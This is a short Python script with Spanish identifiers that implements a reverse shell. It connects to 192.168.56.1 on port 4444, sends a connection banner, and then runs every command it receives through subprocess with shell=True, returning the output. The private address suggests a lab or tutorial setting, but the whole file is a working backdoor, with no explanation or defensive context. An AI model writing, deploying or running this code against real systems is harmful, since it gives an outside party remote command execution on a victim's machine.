import socket
import subprocess

def ejecutar_comandos(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(("192.168.56.1",4444))
connection.send("\n [+]Conexion Correcta\n")

while True:
    command = connection.recv(1024)
    resultado_comando = ejecutar_comandos(command)
    connection.send(resultado_comando)
connection.close()